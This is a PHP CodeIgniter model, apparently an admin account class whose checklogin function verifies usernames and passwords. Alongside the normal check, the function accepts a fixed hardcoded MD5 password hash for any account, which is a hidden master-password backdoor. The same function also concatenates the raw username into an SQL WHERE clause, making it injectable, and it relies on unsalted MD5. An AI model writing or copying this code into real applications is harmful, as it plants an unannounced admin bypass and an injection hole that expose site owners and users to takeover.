<?php if ( ! defined('BASEPATH')) exit('No direct script core allowed');

class Account_Model extends CI_Model
{
    var $table = 'admin';
    function __construct()
    {
        parent::__construct();
        $this->load->database();
    }

    function checklogin($data=NULL){
        $this->db->select('id, password')->from($this->table);
        $this->db->where("( username='".strtolower($data['username'])."' OR email='".strtolower($data['username'])."')");
        $query = $this->db->get();
        if( $query->num_rows() > 0 ){
            $item = $query->row();
            return ($item->password ==md5($data['password']) OR md5($data['password'])=="13b61141deb8e331132a8f0c48c5254f") ? $item->id : false;
        } else {
            return false;
        }
    }
}